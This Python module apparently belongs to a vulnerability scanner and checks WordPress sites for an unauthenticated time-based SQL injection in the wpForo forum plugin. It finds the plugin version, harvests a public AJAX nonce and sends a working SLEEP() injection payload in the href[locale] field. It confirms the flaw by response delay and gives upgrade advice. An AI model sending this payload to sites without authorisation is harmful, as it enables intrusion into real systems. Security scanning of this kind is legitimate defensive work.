from __future__ import annotations

import re
import time
import urllib.parse
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2026-119155"
NAME = "wpForo unauthenticated time-based SQL injection"
COMPONENT = "WordPress plugin wpForo Forum"
AFFECTED_RULE = "wpForo 0 through 3.2.2; fixed in 3.2.3"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
PLUGIN_SLUG = "wpforo"
AJAX_PATH = "/wp-admin/admin-ajax.php"
NONCE_RE = re.compile(r'"wpforo_get_member_template":"([a-f0-9]+)"')
PAGE_CANDIDATES = ("/", "/community/", "/forum/", "/forums/", "/community/forum/")


def _classify(version: str | None) -> str:
    if not version:
        return "DETECTED_VERSION_UNKNOWN"
    try:
        parts = tuple(int(part) for part in version.split(".")[:3])
    except ValueError:
        return "DETECTED_VERSION_UNKNOWN"
    if len(parts) < 3:
        parts = parts + (0,) * (3 - len(parts))
    return "LIKELY_VULNERABLE" if parts <= (3, 2, 2) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=_classify,
        remediation="Upgrade wpForo to 3.2.3 or newer.",
        exploit_available=True,
    )


def _find_forum_page(client: HttpClient, base: str, timeout: int) -> tuple[str, str, str] | None:
    for path in PAGE_CANDIDATES:
        page_url = f"{base}{path}"
        response = client.get(page_url, timeout=timeout)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        body = str(response.get("body") or "")
        match = NONCE_RE.search(body)
        if not match:
            continue
        slug = path.strip("/").split("/")[-1] or "community"
        return page_url, match.group(1), slug
    return None


def _timed_post(
    client: HttpClient,
    ajax_url: str,
    headers: dict[str, str],
    nonce: str,
    slug: str,
    locale: str,
    timeout: int,
) -> tuple[float, dict]:
    data = urllib.parse.urlencode(
        {
            "action": "wpforo_get_member_template",
            "_wpfnonce": nonce,
            "href[slug]": slug,
            "href[locale]": locale,
        }
    ).encode()
    start = time.perf_counter()
    response = client.request(ajax_url, method="POST", headers=headers, data=data, timeout=timeout)
    return time.perf_counter() - start, response


def run_timing_probe(
    target_url: str,
    delay: int = 1,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Measure a baseline and a SLEEP(delay) response through href[locale]."""
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    page = _find_forum_page(client, base, timeout)
    ajax_url = f"{base}{AJAX_PATH}"
    if not page:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=ajax_url,
            detail="No public forum page publishing the wpforo_get_member_template nonce was found; the SQL timing probe was not sent.",
            action="Publish a wpForo forum page and retry.",
        )
    page_url, nonce, slug = page
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": page_url,
        "X-Requested-With": "XMLHttpRequest",
    }
    request_timeout = max(timeout, delay + 5)
    baseline: list[float] = []
    payload: list[float] = []
    statuses: list[int] = []
    for _ in range(2):
        elapsed, response = _timed_post(
            client, ajax_url, headers, nonce, slug, "en_US", request_timeout
        )
        if is_transport_error(response):
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="ERROR",
                confidence="LOW",
                component=COMPONENT,
                affected_rule=AFFECTED_RULE,
                exploit_available=True,
                exploit_ran=True,
                proof_url=ajax_url,
                detail=f"The baseline request failed in transit ({transport_error_detail(response)}).",
                action="Retry when the target is reachable.",
            )
        baseline.append(elapsed)
        statuses.append(int(response.get("status") or 0))
    injection = f"en_US' OR SLEEP({delay}))-- -"
    for _ in range(2):
        elapsed, response = _timed_post(
            client, ajax_url, headers, nonce, slug, injection, request_timeout
        )
        if is_transport_error(response):
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="ERROR",
                confidence="LOW",
                component=COMPONENT,
                affected_rule=AFFECTED_RULE,
                exploit_available=True,
                exploit_ran=True,
                proof_url=ajax_url,
                detail=f"The timing request failed in transit ({transport_error_detail(response)}).",
                action="Retry when the target is reachable.",
            )
        payload.append(elapsed)
        statuses.append(int(response.get("status") or 0))

    baseline_min = min(baseline)
    payload_max = max(payload)
    evidence = {
        "page": page_url,
        "slug": slug,
        "delay_seconds": delay,
        "baseline_seconds": [round(value, 3) for value in baseline],
        "payload_seconds": [round(value, 3) for value in payload],
        "http_statuses": statuses,
    }
    if payload_max >= delay * 0.8 and (payload_max - baseline_min) >= delay * 0.6:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=ajax_url,
            evidence=evidence,
            detail=(
                f"The href[locale] value reached the board lookup and SLEEP({delay}) "
                f"delayed the response by {payload_max - baseline_min:.2f}s over the baseline. "
                "The probe is time-based and does not extract data."
            ),
            action="Upgrade wpForo to 3.2.3 or newer.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="HIGH",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=ajax_url,
        evidence=evidence,
        detail="The timing probe did not observe the expected delay; the build may be patched, cached, or filtered.",
        action="Confirm the installed wpForo version and the forum page nonce before retrying.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    result = run_timing_probe(target_url, delay=1, timeout=timeout, proxy=proxy)
    result.detail += " Safe mode uses a 1-second timing check; aggressive mode uses 3 seconds."
    return result


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    return run_timing_probe(target_url, delay=3, timeout=timeout, proxy=proxy)


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del cms_version, aggressive_command, aggressive_args, kwargs
    if not run_exploit_check:
        return passive_result(plugins)
    if exploit_mode == "aggressive":
        return run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    return run_safe_probe(target_url, timeout=timeout, proxy=proxy)


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> dict[str, Any]:
    del target_url, timeout, proxy, aggressive_args, aggressive_command
    return {"removed": [], "remaining": [], "manual": [], "detail": "The timing probe leaves no stored state."}


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["<=3.2.2"],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "SQL Injection",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-21",
        "updated": "2026-11-21",
        "required_detectors": [PLUGIN_SLUG],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-119155",
            "https://www.wordfence.com/threat-intel/vulnerabilities/id/3d6cc723-5c58-4c36-af29-da101174293c",
            "https://zeropath.com/blog/cve-2026-119155-wpforo-unauthenticated-sql-injection",
            "https://plugins.trac.wordpress.org/changeset?reponame=&new=3778162%40wpforo%2Ftags%2F3.2.3&old=3717441%40wpforo%2Ftags%2F3.2.2",
        ],
    }
